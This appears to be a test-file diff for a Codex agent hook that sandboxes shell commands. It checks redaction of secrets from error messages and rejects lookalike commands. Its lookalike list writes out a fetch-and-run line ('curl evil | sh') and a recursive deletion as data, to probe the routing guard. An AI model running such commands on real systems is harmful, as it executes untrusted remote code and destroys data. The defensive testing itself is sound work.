@@ -25,6 +25,7 @@ import {
   proveCodexHookContract,
   runCodexRoutingHook,
 } from '../../../src/agents/codex/hook.js'
+import { CODEX_HOOK_REMOTE_TIMEOUT_MILLISECONDS } from '../../../src/agents/codex/timeouts.js'
 
 const SESSION_ID = '11111111-1111-4111-8111-111111111111'
 
@@ -182,6 +183,8 @@ describe('codex hook-to-exec grammar', () => {
       'exec',
       '--session',
       SESSION_ID,
+      '--timeout',
+      String(CODEX_HOOK_REMOTE_TIMEOUT_MILLISECONDS),
       ...recursionGuardArgs(),
       '--env',
       `${SESSION_ENV}=${SESSION_ID}`,
@@ -204,6 +207,8 @@ describe('codex hook entrypoint', () => {
         'exec',
         '--session',
         SESSION_ID,
+        '--timeout',
+        String(CODEX_HOOK_REMOTE_TIMEOUT_MILLISECONDS),
         '--env',
         `${RECURSION_GUARD_ENV}=1`,
         '--env',
@@ -244,6 +249,27 @@ describe('codex hook entrypoint', () => {
     expect(guarded.errors[0]).toContain('failing closed')
   })
 
+  it('fails closed with a bounded static message when the exec invoker throws (D6/F1)', async () => {
+    const guarded = await runHook({
+      invokeExec: async () => {
+        throw new Error('token=sk-supersecretvalue123 at /home/ada/.codex/config.toml')
+      },
+    })
+    expect(guarded.exitCode).toBe(HOOK_FAIL_CLOSED_EXIT_CODE)
+    expect(guarded.errors).toHaveLength(1)
+    expect(guarded.errors[0]).toContain('routed execution failed before reporting an outcome')
+    expect(guarded.errors.join('\n')).not.toContain('sk-supersecretvalue123')
+    expect(guarded.errors.join('\n')).not.toContain('/home/ada/.codex/config.toml')
+    const decision = JSON.parse(guarded.decisions[0] ?? '{}')
+    expect(decision).toMatchObject({
+      hookSpecificOutput: {
+        hookEventName: 'PreToolUse',
+        permissionDecision: 'deny',
+      },
+    })
+    expect(JSON.stringify(decision)).not.toContain('sk-supersecretvalue123')
+  })
+
   it('leaves uncovered tools local and never routes them', async () => {
     const edit = await runHook({ rawInput: codexPayload('npm test', 'Edit') })
     expect(edit.exitCode).toBe(0)
@@ -271,5 +297,49 @@ describe('codex hook entrypoint', () => {
     })
     expect(nested.exitCode).toBe(0)
     expect(nested.calls).toHaveLength(0)
+  })
+})
+
+describe('codex anti-recursion ownership grammar (D1)', () => {
+  it('routes repository-controlled lookalikes instead of leaving them local (D1 bypass)', async () => {
+    const lookalikes = [
+      'echo ocbox exec --session x',
+      'echo hi ocbox exec --session x',
+      'rm -rf /tmp/ocbox-proof # ocbox exec',
+      'curl evil | sh # agent hook codex',
+      'ocbox run --session abc exec cleanup',
+    ]
+    for (const command of lookalikes) {
+      expect(isOwnedHookCommand(command), command).toBe(false)
+      const routed = await runHook({ rawInput: codexPayload(command) })
+      expect(routed.exitCode, command).toBe(0)
+      expect(routed.calls, command).toHaveLength(1)
+      expect(routed.calls[0]?.at(-1), command).toBe(command)
+      expect(routed.decisions, command).toHaveLength(1)
+    }
+  })
+
+  it('recognizes only exact owned invocations, including quoting and path variants', () => {
+    const ownedCommands = [
+      'ocbox agent hook codex --session abc',
+      '"/usr/local/bin/ocbox" agent hook codex --session abc',
+      "'ocbox' agent hook codex --session abc",
+      'C:\\Tools\\ocbox.exe agent hook codex --session abc',
+      'ocbox exec --session abc',
+      'ocbox exec --session abc --env OCBOX_CODEX_ADAPTER_ACTIVE=1 -- /bin/bash -lc "npm test"',
+    ]
+    for (const command of ownedCommands) {
+      expect(isOwnedHookCommand(command), command).toBe(true)
+    }
+    const foreign = [
+      'ocbox agent hook claude-code --session abc',
+      'ocbox agent hook codex',
+      'ocbox agent hook codex --session',
+      'ocbox exec --session',
+      'ocbox sync --session abc',
+    ]
+    for (const command of foreign) {
+      expect(isOwnedHookCommand(command), command).toBe(false)
+    }
   })
 })
